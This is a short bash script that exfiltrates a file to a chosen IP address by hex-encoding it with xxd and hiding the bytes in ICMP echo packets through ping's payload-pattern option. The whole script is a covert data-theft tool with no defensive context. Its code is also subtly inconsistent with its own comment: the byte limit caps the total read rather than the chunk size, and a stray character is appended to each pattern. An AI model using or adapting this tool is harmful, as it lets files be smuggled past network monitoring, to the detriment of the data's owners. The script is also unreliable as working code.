#!/usr/bin/env bash

file=$1
ip=$2
bytes=$3

if [ -z "$bytes" ]; then
    bytes=20
fi

# use xxd to encode the file and use ping to send each chunk of the file as bytes size
for i in $(xxd -l $bytes -ps "$file"); do
    ping -c 1 -p "$i"e "$ip"
done
